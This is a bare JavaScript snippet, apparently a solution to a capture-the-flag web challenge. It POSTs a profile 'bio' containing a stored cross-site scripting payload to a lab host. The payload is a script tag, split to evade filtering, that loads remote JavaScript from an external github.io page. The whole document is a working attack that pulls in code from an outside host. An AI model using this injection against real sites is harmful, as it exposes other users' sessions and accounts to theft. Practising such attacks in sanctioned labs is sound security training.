

  var formData = new FormData();

  const payload = "<script src='https:/" + "/matiaselima.github.io/ctf/blog_hacklab_v2/jeni.js'></script>";
  
  formData.append("bio", payload); 
  formData.append("profile_pic", new Blob([""]), "");

  fetch('https://chl-ccdde8bd-d1b4-4896-99af-e358dc89319d-blog-hacklab-v2.softwareseguro.com.ar/biographies', {
    method: 'POST',
    body: formData

  });

